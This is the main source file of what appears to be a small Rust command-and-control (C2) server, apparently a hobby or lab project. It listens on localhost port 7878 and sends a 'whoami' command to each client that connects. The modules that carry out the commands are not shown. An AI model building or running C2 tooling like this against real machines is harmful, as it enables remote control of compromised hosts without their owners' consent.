use std::{net::{TcpListener, TcpStream}, thread};

mod server;
mod interface;

use crate::server::*;

fn main() -> std::io::Result<()> {
    let listener = TcpListener::bind("127.0.0.1:7878")?;
    println!("Server listening on port 7878");

    let command = vec![String::from("whoami")];
    let mut c2 = C2::new(command);
    
    // accept incoming streams/clients and add to C2
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New client connected to C2");
                c2.clients.push(Client::new(stream));
                c2.send_commands();
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }        
    }

    Ok(())
}

